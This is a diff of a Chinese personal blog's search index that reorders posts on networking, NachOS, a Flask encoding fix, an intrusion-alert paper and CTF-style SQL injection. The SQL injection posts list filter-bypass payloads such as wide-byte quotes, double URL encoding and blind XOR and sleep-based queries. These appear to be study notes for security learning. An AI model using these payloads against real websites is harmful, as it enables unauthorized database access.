@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>论文笔记:Extracting and Evaluating Similar and Unique Cyber Attack Strategies from Intrusion Alerts</title>
+    <url>/2019/07/30/Extracting-and-Evaluating-Similar-and-UniqueCyber-Attack-Strategies-from-Intrusion-Alerts/</url>
+    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>由于大量的警报与通用规则产生的高假阳性，安全分析员很难去评估攻击何时发生，怎样发生，在哪里发生。</p>
+<h2 id="1-主要内容"><a href="#1-主要内容" class="headerlink" title="1. 主要内容"></a>1. 主要内容</h2><p>这篇文章旨在系统地处理大量的、有噪音的入侵检测警报日志，从而发现攻击者在实现攻击目标时采取的步骤以及攻击者之间的相似和不同的地方。作者的思路是首先提取出入侵警报文本中的关键特征如: time stamp, source IP, destination IP, 攻击类型，严重性等等组成的元组来作为该文章的主要研究目标入侵警报观测量(IDS alert observables)。其次，对这些大量警报按特定的标准进行去重，使用Gaussian过滤器进行降噪，将这些警报转换为攻击序列。然后，这些攻击活动序列可用于以基于后缀的(suffix-based)概率模型的形式表征网络攻击。最后，通过比较概率模型可以识别独特和类似的攻击模式。</p>
+<h2 id="2-设计实现"><a href="#2-设计实现" class="headerlink" title="2. 设计实现"></a>2. 设计实现</h2><p>如图1所示，该文章提出的系统架构一共分为了4个部分：数据处理(主要是去重)、降噪、攻击活动序列生成、攻击模型生成(基于后缀的概率模型)</p>
+<p><figure class="figure"><img src="https://i.loli.net/2019/07/31/5d414fd85500b84999.png" alt="Fig.1 系统架构"><figcaption class="figure__caption">Fig.1 系统架构</figcaption></figure></p>
+]]></content>
+      <categories>
+        <category>Paper</category>
+      </categories>
+  </entry>
+  <entry>
     <title>自顶向下计算机网络知识笔记(二)</title>
     <url>/2019/04/29/Application%20Layer/</url>
     <content><![CDATA[<h1 id="Application-Layer"><a href="#Application-Layer" class="headerlink" title="Application Layer"></a>Application Layer</h1><h2 id="Principles-of-network-applications"><a href="#Principles-of-network-applications" class="headerlink" title="Principles of network applications"></a>Principles of network applications</h2><h3 id="architecture"><a href="#architecture" class="headerlink" title="architecture"></a>architecture</h3><ul>
@@ -504,18 +516,6 @@
       <tags>
         <tag>Notebook</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>论文笔记:Extracting and Evaluating Similar and Unique Cyber Attack Strategies from Intrusion Alerts</title>
-    <url>/2019/07/30/Extracting-and-Evaluating-Similar-and-UniqueCyber-Attack-Strategies-from-Intrusion-Alerts/</url>
-    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>由于大量的警报与通用规则产生的高假阳性，安全分析员很难去评估攻击何时发生，怎样发生，在哪里发生。</p>
-<h2 id="1-主要内容"><a href="#1-主要内容" class="headerlink" title="1. 主要内容"></a>1. 主要内容</h2><p>这篇文章旨在系统地处理大量的、有噪音的入侵检测警报日志，从而发现攻击者在实现攻击目标时采取的步骤以及攻击者之间的相似和不同的地方。作者的思路是首先提取出入侵警报文本中的关键特征如: time stamp, source IP, destination IP, 攻击类型，严重性等等组成的元组来作为该文章的主要研究目标入侵警报观测量(IDS alert observables)。其次，对这些大量警报按特定的标准进行去重，使用Gaussian过滤器进行降噪，将这些警报转换为攻击序列。然后，这些攻击活动序列可用于以基于后缀的(suffix-based)概率模型的形式表征网络攻击。最后，通过比较概率模型可以识别独特和类似的攻击模式。</p>
-<h2 id="2-设计实现"><a href="#2-设计实现" class="headerlink" title="2. 设计实现"></a>2. 设计实现</h2><p>如图1所示，该文章提出的系统架构一共分为了4个部分：数据处理(主要是去重)、降噪、攻击活动序列生成、攻击模型生成(基于后缀的概率模型)</p>
-<p><figure class="figure"><img src="https://i.loli.net/2019/07/31/5d414fd85500b84999.png" alt="Fig.1 系统架构"><figcaption class="figure__caption">Fig.1 系统架构</figcaption></figure></p>
-]]></content>
-      <categories>
-        <category>Paper</category>
-      </categories>
   </entry>
   <entry>
     <title>自顶向下计算机网络知识笔记(一)</title>
@@ -1078,23 +1078,6 @@
       <categories>
         <category>Paper</category>
       </categories>
-  </entry>
-  <entry>
-    <title>flask jinja2 UnicodeDecodeError 解决方法</title>
-    <url>/2019/04/08/bug-flask/</url>
-    <content><![CDATA[<p><strong>在python2中,当有中文传递给jinja2模板会报如下错误:</strong></p>
-<blockquote>
-<p>UnicodeDecodeError: ‘ascii’ codec can’t decode byte 0xe6 in position 0: ordinal not in range(128)</p>
-</blockquote>
-<p>这个时侯单单在字符串前加u表示为unicode字符已经没有用了，而是需要加上一段代码来搞定：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys #导入sys模块</span><br><span class="line"></span><br><span class="line">reload(sys) #在之前import进来时,setdefaultencoding函数在被系统调用后删除了,所以必须重新加载此模块</span><br><span class="line"></span><br><span class="line">sys.setdefaultencoding(&#39;utf-8&#39;) #修改默认编码方式</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Bugs</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>flask</tag>
-      </tags>
   </entry>
   <entry>
     <title>自顶向下计算机网络知识笔记(三)</title>
@@ -1982,6 +1965,23 @@
       </tags>
   </entry>
   <entry>
+    <title>flask jinja2 UnicodeDecodeError 解决方法</title>
+    <url>/2019/04/08/bug-flask/</url>
+    <content><![CDATA[<p><strong>在python2中,当有中文传递给jinja2模板会报如下错误:</strong></p>
+<blockquote>
+<p>UnicodeDecodeError: ‘ascii’ codec can’t decode byte 0xe6 in position 0: ordinal not in range(128)</p>
+</blockquote>
+<p>这个时侯单单在字符串前加u表示为unicode字符已经没有用了，而是需要加上一段代码来搞定：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys #导入sys模块</span><br><span class="line"></span><br><span class="line">reload(sys) #在之前import进来时,setdefaultencoding函数在被系统调用后删除了,所以必须重新加载此模块</span><br><span class="line"></span><br><span class="line">sys.setdefaultencoding(&#39;utf-8&#39;) #修改默认编码方式</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Bugs</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>flask</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>哲学家就餐问题详解</title>
     <url>/2019/04/14/deadlock-problem/</url>
     <content><![CDATA[<blockquote>
@@ -2008,63 +2008,6 @@
       </categories>
       <tags>
         <tag>Deadlock</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NachOS源码学习(一)：线程升级</title>
-    <url>/2019/05/03/nachos1/</url>
-    <content><![CDATA[<h2 id="NachOS简介"><a href="#NachOS简介" class="headerlink" title="NachOS简介"></a>NachOS简介</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><blockquote>
-<p>Nachos的全称是“Not Another Completely Heuristic Operating System”，它是一个可修改和跟踪的操作系统教学软件。它给出了一个支持多线程和虚拟存储的操作系统骨架，可让学生在较短的时间内对操作系统中的基本原理和核心算法有一个全面和完整的了解。</p>
-</blockquote>
-<h4 id="NachOS工作机制"><a href="#NachOS工作机制" class="headerlink" title="NachOS工作机制"></a>NachOS工作机制</h4><p><figure class="figure"><img src="https://i.loli.net/2019/05/03/5ccc075bd7d08.jpg" alt="1.jpg"><figcaption class="figure__caption">1.jpg</figcaption></figure></p>
-<h4 id="NachOS源码的大体结构"><a href="#NachOS源码的大体结构" class="headerlink" title="NachOS源码的大体结构"></a>NachOS源码的大体结构</h4><p><figure class="figure"><img src="https://i.loli.net/2019/05/03/5ccc076093d5a.png" alt="2.jpg"><figcaption class="figure__caption">2.jpg</figcaption></figure></p>
-<h2 id="NachOS源码学习-线程模块"><a href="#NachOS源码学习-线程模块" class="headerlink" title="NachOS源码学习:线程模块"></a>NachOS源码学习:线程模块</h2><h4 id="理论部分"><a href="#理论部分" class="headerlink" title="理论部分:"></a>理论部分:</h4><p>Nachos 广泛采用线程的概念，是多线程操作系统。线程是Nachos处理机调度的单位，在Nachos中线程分成两类:</p>
-<ul>
-<li>系统线程。所谓<strong>系统线程是只运行核心代码的线程</strong>，它运行在核心态下，并且占用宿主机的资源，系统线程共享Nachos操作系统本身的正文段和数据段；<strong>一个系统线程完成一件独立的任务</strong>，比如在Nachos网络部分，有一个独立的线程一直监测有无发给自己的数据报。 </li>
-<li>用户线程。Nachos的另一类线程同Nachos中的用户进程有关。Nachos中用户进程由两部分组成，核心代码部分和用户程序部分。用户进程的进程控制块是线程控制块基础上的扩充。<strong>每当系统接收到生成用户进程的请求时，首先生成一个系统线程</strong>，进程控制块中有保存线程运行现场的空间，保证线程切换时现场不会丢失。<strong>该线程的作用是给用户程序分配虚拟机内存空间，并把用户程序的代码段和数据段装入用户地址空间，然后调用解释器解释执行用户程序</strong>；由于Nachos模拟的是一个单机环境，多个用户进程会竞争使用Nachos唯一的处理机资源，所以在<strong>Nachos用户进程的进程控制块中增加有虚拟机运行现场空间以及进程的地址空间指针等内容</strong>，保证用户进程在虚拟机上的正常运行。系统线程竞争使用宿主机的CPU资源，而用户进程的用户程序部分 竞争使用的是虚拟机的CPU和寄存器。</li>
-</ul>
-<h4 id="NachOS线程管理的特点"><a href="#NachOS线程管理的特点" class="headerlink" title="NachOS线程管理的特点"></a>NachOS线程管理的特点</h4><ol>
-<li>线程个数没有限制。一般的操作系统，进程的数目是有限的，但是Nachos 中线程数目是无限的。线程的控制结构和系统线程的运行是占用宿主机的。能够开多少线程完全由宿主机条件限制，理论上是无限的。</li>
-<li>线程调度简单。启动了时钟中断的情况下，当时钟中断到来时。如果就绪线程队列中有就绪线程，就必须进行线程切换。没有启动时钟中断的情况下，Nachos使用非抢占式调度，即进程在运行过程中不会切换到其它进程运行，除非其主动放弃处理机或者运行结束。</li>
-<li>线程数据结构简单。Nachos中线程数据结构定义简单，没用户ID，线程ID，无法根据线程ID实现通信，同步互斥，也没有全局性的线程管理机制。</li>
-</ol>
-]]></content>
-      <categories>
-        <category>OS</category>
-      </categories>
-      <tags>
-        <tag>NachOS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NachOS源码学习(二)：同步机制</title>
-    <url>/2019/05/03/nachos2/</url>
-    <content><![CDATA[<h2 id="源码部分Synch-cc-h"><a href="#源码部分Synch-cc-h" class="headerlink" title="源码部分Synch.cc(h)"></a>源码部分Synch.cc(h)</h2><p>synch.cc(h)中一个有三个类Semaphore,Lock,Condition：</p>
-<ol>
-<li>Semaphore，能够通过一个名字和一个值来初始化一个信号量。<ul>
-<li>P函数的作用类似于<code>sem_wait()</code>，它判断当前线程能否使用临界资源，若不能则将当前线程放入等待队列(value&gt;0),若能(value&gt;0)则将值减一，进入临界区。</li>
-<li>V函数的作用类似于<code>sem_pos()</code>,当等待队列不为空时，则取出等待队列队首的线程并将其标注为ReadyToRun,使该线程进入就绪状态，并且初始值加1。</li>
-</ul>
-</li>
-<li>Lock,没有具体的实现，只有基本结构。可以看到它可以用二元信号量来实现。<ul>
-<li>Aquire()函数就相当于Semphore中的P操作。</li>
-<li>Remove()函数相当于Semaphore中的V操作。</li>
-</ul>
-</li>
-<li>Condition,与信号量和锁机制不一样，它是没有值的。当一个线程需要的某种条件没有得到满足时，可以将自己作为一个等待条件变量的线程插入所有等待该条件变量的队列，只要条件一旦得到满足，该线程就会被唤醒继续运行。条件变量总是和锁机制一起使。它的基本方法有Wait、Signal以及BroadCast。所有这些操作必须在当前线程获得一个锁的前提下，而且所有对一个条件变量进行的操作必须建立在同一个锁的前提下。<ul>
-<li>Wait(Lock *conditionLock) 线程等待条件变量。条件变量的实现Wait()，先关闭中断，将锁释放，然后将当前线程加入等待条件变量的队列，当前线程睡眠。如果被唤醒，需要重新获得锁。</li>
-<li>Signal(Lock *conditionLock) 从条件变量的等待队列中唤醒一个等待该条件变量的线程。Signal()操作，如果等待队列非空，则将队列中的一个线程唤醒，加入线程就绪队列。</li>
-<li>BroadCast(Lock *conditionLock) 唤醒所有等待该条件变量的线程。<h2 id="源码部分Synchlist-cc-h"><a href="#源码部分Synchlist-cc-h" class="headerlink" title="源码部分Synchlist.cc(h)"></a>源码部分Synchlist.cc(h)</h2></li>
-</ul>
-</li>
-</ol>
-<p>synchlist.cc(h)中只有一个类，实现了对队列的互斥访问。Append()函数用于添加一个线程到队尾。Remove()函数用于将队首的线程移出队列。用Lock锁实现了Append()函数与Remove()函数对队列的互斥访问，两者之间不能同时被CPU运行。</p>
-]]></content>
-      <categories>
-        <category>OS</category>
-      </categories>
-      <tags>
-        <tag>NachOS</tag>
       </tags>
   </entry>
   <entry>
@@ -2161,20 +2104,28 @@
       </tags>
   </entry>
   <entry>
-    <title>NachOS源码学习(三):内存管理</title>
-    <url>/2019/05/13/nachos3/</url>
-    <content><![CDATA[<h3 id="阅读machine目录下的machine-h-cc-translate-h-cc-和userprog目录下的exception-h-cc-理解当前的所采用的TLB机制和地址转换机制"><a href="#阅读machine目录下的machine-h-cc-translate-h-cc-和userprog目录下的exception-h-cc-理解当前的所采用的TLB机制和地址转换机制" class="headerlink" title="阅读machine目录下的machine.h(cc),translate.h(cc)和userprog目录下的exception.h(cc)理解当前的所采用的TLB机制和地址转换机制"></a>阅读machine目录下的machine.h(cc),translate.h(cc)和userprog目录下的exception.h(cc)理解当前的所采用的TLB机制和地址转换机制</h3><h4 id="translate-h-cc"><a href="#translate-h-cc" class="headerlink" title="translate.h(cc)"></a>translate.h(cc)</h4><ul>
-<li>定义了TranslationEntry类，包括virtualPage,physicalPage以及一些标志位:valid,redonly等。</li>
-<li>标识了用户空间的第i个虚拟页应该映射到主存的第j个物理页，且当前这个物理页所处的状态。</li>
-<li><p>Translate()函数接收虚拟地址，物理地址，页尺寸，是否写入为参数。将虚拟地址转换为实际地址。</p>
-<h4 id="machine-h-cc"><a href="#machine-h-cc" class="headerlink" title="machine.h(cc)"></a>machine.h(cc)</h4></li>
-<li><p>定义了页尺寸,物理内存中的帧数,内存中容量,TLB的大小。</p>
-</li>
-<li>定义Machine类,用于模拟主机的硬件。</li>
-<li>Machine类中包含了一些重要的函数Run(),ReadRegister(),WriteRegister()</li>
-<li>遍历TLB数组，查找是否有对应的映射。</li>
-<li>如果有，TLB命中，直接进行物理地址转换；否则TLB miss,进入Exception处理。</li>
+    <title>NachOS源码学习(二)：同步机制</title>
+    <url>/2019/05/03/nachos2/</url>
+    <content><![CDATA[<h2 id="源码部分Synch-cc-h"><a href="#源码部分Synch-cc-h" class="headerlink" title="源码部分Synch.cc(h)"></a>源码部分Synch.cc(h)</h2><p>synch.cc(h)中一个有三个类Semaphore,Lock,Condition：</p>
+<ol>
+<li>Semaphore，能够通过一个名字和一个值来初始化一个信号量。<ul>
+<li>P函数的作用类似于<code>sem_wait()</code>，它判断当前线程能否使用临界资源，若不能则将当前线程放入等待队列(value&gt;0),若能(value&gt;0)则将值减一，进入临界区。</li>
+<li>V函数的作用类似于<code>sem_pos()</code>,当等待队列不为空时，则取出等待队列队首的线程并将其标注为ReadyToRun,使该线程进入就绪状态，并且初始值加1。</li>
 </ul>
+</li>
+<li>Lock,没有具体的实现，只有基本结构。可以看到它可以用二元信号量来实现。<ul>
+<li>Aquire()函数就相当于Semphore中的P操作。</li>
+<li>Remove()函数相当于Semaphore中的V操作。</li>
+</ul>
+</li>
+<li>Condition,与信号量和锁机制不一样，它是没有值的。当一个线程需要的某种条件没有得到满足时，可以将自己作为一个等待条件变量的线程插入所有等待该条件变量的队列，只要条件一旦得到满足，该线程就会被唤醒继续运行。条件变量总是和锁机制一起使。它的基本方法有Wait、Signal以及BroadCast。所有这些操作必须在当前线程获得一个锁的前提下，而且所有对一个条件变量进行的操作必须建立在同一个锁的前提下。<ul>
+<li>Wait(Lock *conditionLock) 线程等待条件变量。条件变量的实现Wait()，先关闭中断，将锁释放，然后将当前线程加入等待条件变量的队列，当前线程睡眠。如果被唤醒，需要重新获得锁。</li>
+<li>Signal(Lock *conditionLock) 从条件变量的等待队列中唤醒一个等待该条件变量的线程。Signal()操作，如果等待队列非空，则将队列中的一个线程唤醒，加入线程就绪队列。</li>
+<li>BroadCast(Lock *conditionLock) 唤醒所有等待该条件变量的线程。<h2 id="源码部分Synchlist-cc-h"><a href="#源码部分Synchlist-cc-h" class="headerlink" title="源码部分Synchlist.cc(h)"></a>源码部分Synchlist.cc(h)</h2></li>
+</ul>
+</li>
+</ol>
+<p>synchlist.cc(h)中只有一个类，实现了对队列的互斥访问。Append()函数用于添加一个线程到队尾。Remove()函数用于将队首的线程移出队列。用Lock锁实现了Append()函数与Remove()函数对队列的互斥访问，两者之间不能同时被CPU运行。</p>
 ]]></content>
       <categories>
         <category>OS</category>
@@ -2281,16 +2232,26 @@
       </tags>
   </entry>
   <entry>
-    <title>其他类型注入的详解(2)</title>
-    <url>/2019/03/16/sql3/</url>
-    <content><![CDATA[<p>###2.截断注入</p>
-<p>参考题目:<a href="https://www.ichunqiu.com/battalion" target="_blank" rel="noopener">wanna see your hat</a></p>
+    <title>NachOS源码学习(三):内存管理</title>
+    <url>/2019/05/13/nachos3/</url>
+    <content><![CDATA[<h3 id="阅读machine目录下的machine-h-cc-translate-h-cc-和userprog目录下的exception-h-cc-理解当前的所采用的TLB机制和地址转换机制"><a href="#阅读machine目录下的machine-h-cc-translate-h-cc-和userprog目录下的exception-h-cc-理解当前的所采用的TLB机制和地址转换机制" class="headerlink" title="阅读machine目录下的machine.h(cc),translate.h(cc)和userprog目录下的exception.h(cc)理解当前的所采用的TLB机制和地址转换机制"></a>阅读machine目录下的machine.h(cc),translate.h(cc)和userprog目录下的exception.h(cc)理解当前的所采用的TLB机制和地址转换机制</h3><h4 id="translate-h-cc"><a href="#translate-h-cc" class="headerlink" title="translate.h(cc)"></a>translate.h(cc)</h4><ul>
+<li>定义了TranslationEntry类，包括virtualPage,physicalPage以及一些标志位:valid,redonly等。</li>
+<li>标识了用户空间的第i个虚拟页应该映射到主存的第j个物理页，且当前这个物理页所处的状态。</li>
+<li><p>Translate()函数接收虚拟地址，物理地址，页尺寸，是否写入为参数。将虚拟地址转换为实际地址。</p>
+<h4 id="machine-h-cc"><a href="#machine-h-cc" class="headerlink" title="machine.h(cc)"></a>machine.h(cc)</h4></li>
+<li><p>定义了页尺寸,物理内存中的帧数,内存中容量,TLB的大小。</p>
+</li>
+<li>定义Machine类,用于模拟主机的硬件。</li>
+<li>Machine类中包含了一些重要的函数Run(),ReadRegister(),WriteRegister()</li>
+<li>遍历TLB数组，查找是否有对应的映射。</li>
+<li>如果有，TLB命中，直接进行物理地址转换；否则TLB miss,进入Exception处理。</li>
+</ul>
 ]]></content>
       <categories>
-        <category>Web Security</category>
+        <category>OS</category>
       </categories>
       <tags>
-        <tag>Sql</tag>
+        <tag>NachOS</tag>
       </tags>
   </entry>
   <entry>
@@ -2355,79 +2316,42 @@
       </tags>
   </entry>
   <entry>
-    <title>SQL注入中的绕过</title>
-    <url>/2019/03/16/sql7/</url>
-    <content><![CDATA[<p>###一.对于关键字的绕过</p>
-<ol>
-<li>注释符绕过:<code>uni/**/on se/**/lect</code></li>
-<li>大小写绕过:<code>UniOn SeleCt</code></li>
-<li>双关键字绕过:<code>ununionion seselectlect</code></li>
-<li>&lt;&gt;绕过:<code>unio&lt;&gt;n sel&lt;&gt;ect</code>(可能是有些网站为了防止xss注入,所以过滤了&lt;&gt;,参照i春秋sql)</li>
-<li>对于and,or的绕过其实还可以尝试一下&amp;&amp;,||,<a href="https://blog.csdn.net/zpy1998zpy/article/details/80667775" target="_blank" rel="noopener">异或注入</a></li>
-</ol>
-<p><strong>这里需要注意一点就是or被过滤的时候order,information中的or也被过滤了</strong></p>
-<hr>
-<p>###二.对特殊字符的绕过</p>
-<ul>
-<li><p>对空格的绕过:</br></p>
-<pre>两个空格代替一个,用tab键代替空格
-`/**/ %20 %09 %0a` 
-利用空格绕过:很多关键字都可以写成带括号的形式select(),or()
-特殊函数中的空格绕过:ascii(mid(xxfrom(1))) ascii(substr(xxfrom(1)))</pre>
-</li>
-<li><p>对单引号的绕过:</br><br><code>宽字节 %bf%27 %df%27 %aa%27(争对字符集为GBK时使用</code></br><br><code>十六进制绕过(针对需要输入表名的时候 &#39;user&#39;=&gt;0x7573657273)</code></br></p>
-</li>
-<li><p>对逗号的绕过:</p>
-  <pre>
-  substr(x,1,1),mid(x,1,1)=>substr(x from 1 for 1) mid(x from 1 for 1)
-  limit 0,1=> limit 0 offset 1
-  join(本身是用来连接两个表单的,所以join一定是要放在from后面放表单的位置):
-  union select 1,2 =>
-  union select * from (select 1)a join (select 2)b
-  select case when (条件) then (代码1) else (代码2) end 可以对应上if(条件,代码1,代码2)
-  if(substring((select user()) from 1 for 1)='e',sleep(5),1)
-  可以变为
-  select case when substring((select user()) from 1 for 1)='e' then sleep(5) else 1 end
-   </pre>
-</li>
-<li><p>等号的绕过:</p>
-<pre>
-  利用<>(即不等于号)绕过
-  利用like绕过
-  利用greatest()绕过(greatest(a,b)返回较大的那个数)
-  ?id=' or 1 like 1
-  ?id=' or 1 <> 1
-  ?id=' union select greatest(substr((select user()),1,1),95)
-</pre>
-
-</li>
-</ul>
-<hr>
-<p>###三.其他类型的绕过</p>
-<ul>
-<li><p>编码绕过:</p>
-<pre>
-  * 双重url编码:?id=1%252f%252aUNION%252f%252aSELECT%252f%252a1,2,password%252f%252aFROM%252f%252a/Users--+
-  * unicode编码:'=> %u0037 %u02b9
-                空格=> %u0020 %uff00
-                左括号=> %u0028 %uff08
-                  右括号=> %u0029 %uff09
-</pre>    
-</li>
-<li><p>相同字符的绕过:</br><br>题目中有是可能会出现一种情况:</p>
-<blockquote>
-<p>它不允许出现某个字符串,但是在数据库中又确实存在这个字符串,再加之mysql与php的编码字符集不相同,便可以利用相似的字符将其绕过</p>
-</blockquote>
-</li>
-</ul>
-<p><figure class="figure"><img src="https://i.loli.net/2018/09/13/5b9a54128b0b7.png" alt="1.png"><figcaption class="figure__caption">1.png</figcaption></figure></p>
-<p>可以参考的题目<a href="https://www.ichunqiu.com/battalion" target="_blank" rel="noopener">百度杯十月场look</a></p>
+    <title>其他类型注入的详解(2)</title>
+    <url>/2019/03/16/sql3/</url>
+    <content><![CDATA[<p>###2.截断注入</p>
+<p>参考题目:<a href="https://www.ichunqiu.com/battalion" target="_blank" rel="noopener">wanna see your hat</a></p>
 ]]></content>
       <categories>
         <category>Web Security</category>
       </categories>
       <tags>
         <tag>Sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NachOS源码学习(一)：线程升级</title>
+    <url>/2019/05/03/nachos1/</url>
+    <content><![CDATA[<h2 id="NachOS简介"><a href="#NachOS简介" class="headerlink" title="NachOS简介"></a>NachOS简介</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><blockquote>
+<p>Nachos的全称是“Not Another Completely Heuristic Operating System”，它是一个可修改和跟踪的操作系统教学软件。它给出了一个支持多线程和虚拟存储的操作系统骨架，可让学生在较短的时间内对操作系统中的基本原理和核心算法有一个全面和完整的了解。</p>
+</blockquote>
+<h4 id="NachOS工作机制"><a href="#NachOS工作机制" class="headerlink" title="NachOS工作机制"></a>NachOS工作机制</h4><p><figure class="figure"><img src="https://i.loli.net/2019/05/03/5ccc075bd7d08.jpg" alt="1.jpg"><figcaption class="figure__caption">1.jpg</figcaption></figure></p>
+<h4 id="NachOS源码的大体结构"><a href="#NachOS源码的大体结构" class="headerlink" title="NachOS源码的大体结构"></a>NachOS源码的大体结构</h4><p><figure class="figure"><img src="https://i.loli.net/2019/05/03/5ccc076093d5a.png" alt="2.jpg"><figcaption class="figure__caption">2.jpg</figcaption></figure></p>
+<h2 id="NachOS源码学习-线程模块"><a href="#NachOS源码学习-线程模块" class="headerlink" title="NachOS源码学习:线程模块"></a>NachOS源码学习:线程模块</h2><h4 id="理论部分"><a href="#理论部分" class="headerlink" title="理论部分:"></a>理论部分:</h4><p>Nachos 广泛采用线程的概念，是多线程操作系统。线程是Nachos处理机调度的单位，在Nachos中线程分成两类:</p>
+<ul>
+<li>系统线程。所谓<strong>系统线程是只运行核心代码的线程</strong>，它运行在核心态下，并且占用宿主机的资源，系统线程共享Nachos操作系统本身的正文段和数据段；<strong>一个系统线程完成一件独立的任务</strong>，比如在Nachos网络部分，有一个独立的线程一直监测有无发给自己的数据报。 </li>
+<li>用户线程。Nachos的另一类线程同Nachos中的用户进程有关。Nachos中用户进程由两部分组成，核心代码部分和用户程序部分。用户进程的进程控制块是线程控制块基础上的扩充。<strong>每当系统接收到生成用户进程的请求时，首先生成一个系统线程</strong>，进程控制块中有保存线程运行现场的空间，保证线程切换时现场不会丢失。<strong>该线程的作用是给用户程序分配虚拟机内存空间，并把用户程序的代码段和数据段装入用户地址空间，然后调用解释器解释执行用户程序</strong>；由于Nachos模拟的是一个单机环境，多个用户进程会竞争使用Nachos唯一的处理机资源，所以在<strong>Nachos用户进程的进程控制块中增加有虚拟机运行现场空间以及进程的地址空间指针等内容</strong>，保证用户进程在虚拟机上的正常运行。系统线程竞争使用宿主机的CPU资源，而用户进程的用户程序部分 竞争使用的是虚拟机的CPU和寄存器。</li>
+</ul>
+<h4 id="NachOS线程管理的特点"><a href="#NachOS线程管理的特点" class="headerlink" title="NachOS线程管理的特点"></a>NachOS线程管理的特点</h4><ol>
+<li>线程个数没有限制。一般的操作系统，进程的数目是有限的，但是Nachos 中线程数目是无限的。线程的控制结构和系统线程的运行是占用宿主机的。能够开多少线程完全由宿主机条件限制，理论上是无限的。</li>
+<li>线程调度简单。启动了时钟中断的情况下，当时钟中断到来时。如果就绪线程队列中有就绪线程，就必须进行线程切换。没有启动时钟中断的情况下，Nachos使用非抢占式调度，即进程在运行过程中不会切换到其它进程运行，除非其主动放弃处理机或者运行结束。</li>
+<li>线程数据结构简单。Nachos中线程数据结构定义简单，没用户ID，线程ID，无法根据线程ID实现通信，同步互斥，也没有全局性的线程管理机制。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>OS</category>
+      </categories>
+      <tags>
+        <tag>NachOS</tag>
       </tags>
   </entry>
   <entry>
@@ -2452,25 +2376,6 @@
 <li>登陆验证的SQL语句没有和用户名和密码一起验证。如果是验证流程是先根据用户名查找出对应的密码，然后再比对密码的话，那么也不能进行利用。因为数据库一般取第一条则是目标用户的记录，那么你传输的密码肯定是和目标用户密码匹配不上的</li>
 </ol>
 <p>####实战:Bugku-login1<br><a href="http://123.206.31.85:49163/" target="_blank" rel="noopener">login1</a></p>
-]]></content>
-      <categories>
-        <category>Web Security</category>
-      </categories>
-      <tags>
-        <tag>Sql</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>其他类型注入的详解(5)</title>
-    <url>/2019/03/16/sql8/</url>
-    <content><![CDATA[<h3 id="5-sql异或注入"><a href="#5-sql异或注入" class="headerlink" title="5.sql异或注入"></a>5.sql异或注入</h3><p>当我们在尝试SQL注入时,发现union,and被完全过滤掉了,就可以考虑使用异或注入。</p>
-<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h4><ul>
-<li>异或运算规则: <code>1^1=0 0^0=0 0^1=1</code><pre><code>`1^1^1=0 1^1^0=0`
-</code></pre></li>
-<li>构造payload:<code>&#39;^ascii(mid(database(),1,1)=98)^0</code></li>
-</ul>
-<p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</p>
-<h4 id="实际应用-Bugku-login3"><a href="#实际应用-Bugku-login3" class="headerlink" title="实际应用:Bugku-login3"></a>实际应用:Bugku-login3</h4><p><a href="http://123.206.31.85:49167/" target="_blank" rel="noopener">login3</a></p>
 ]]></content>
       <categories>
         <category>Web Security</category>
@@ -2558,6 +2463,101 @@
       <categories>
         <category>Paper</category>
       </categories>
+  </entry>
+  <entry>
+    <title>其他类型注入的详解(5)</title>
+    <url>/2019/03/16/sql8/</url>
+    <content><![CDATA[<h3 id="5-sql异或注入"><a href="#5-sql异或注入" class="headerlink" title="5.sql异或注入"></a>5.sql异或注入</h3><p>当我们在尝试SQL注入时,发现union,and被完全过滤掉了,就可以考虑使用异或注入。</p>
+<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h4><ul>
+<li>异或运算规则: <code>1^1=0 0^0=0 0^1=1</code><pre><code>`1^1^1=0 1^1^0=0`
+</code></pre></li>
+<li>构造payload:<code>&#39;^ascii(mid(database(),1,1)=98)^0</code></li>
+</ul>
+<p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</p>
+<h4 id="实际应用-Bugku-login3"><a href="#实际应用-Bugku-login3" class="headerlink" title="实际应用:Bugku-login3"></a>实际应用:Bugku-login3</h4><p><a href="http://123.206.31.85:49167/" target="_blank" rel="noopener">login3</a></p>
+]]></content>
+      <categories>
+        <category>Web Security</category>
+      </categories>
+      <tags>
+        <tag>Sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入中的绕过</title>
+    <url>/2019/03/16/sql7/</url>
+    <content><![CDATA[<p>###一.对于关键字的绕过</p>
+<ol>
+<li>注释符绕过:<code>uni/**/on se/**/lect</code></li>
+<li>大小写绕过:<code>UniOn SeleCt</code></li>
+<li>双关键字绕过:<code>ununionion seselectlect</code></li>
+<li>&lt;&gt;绕过:<code>unio&lt;&gt;n sel&lt;&gt;ect</code>(可能是有些网站为了防止xss注入,所以过滤了&lt;&gt;,参照i春秋sql)</li>
+<li>对于and,or的绕过其实还可以尝试一下&amp;&amp;,||,<a href="https://blog.csdn.net/zpy1998zpy/article/details/80667775" target="_blank" rel="noopener">异或注入</a></li>
+</ol>
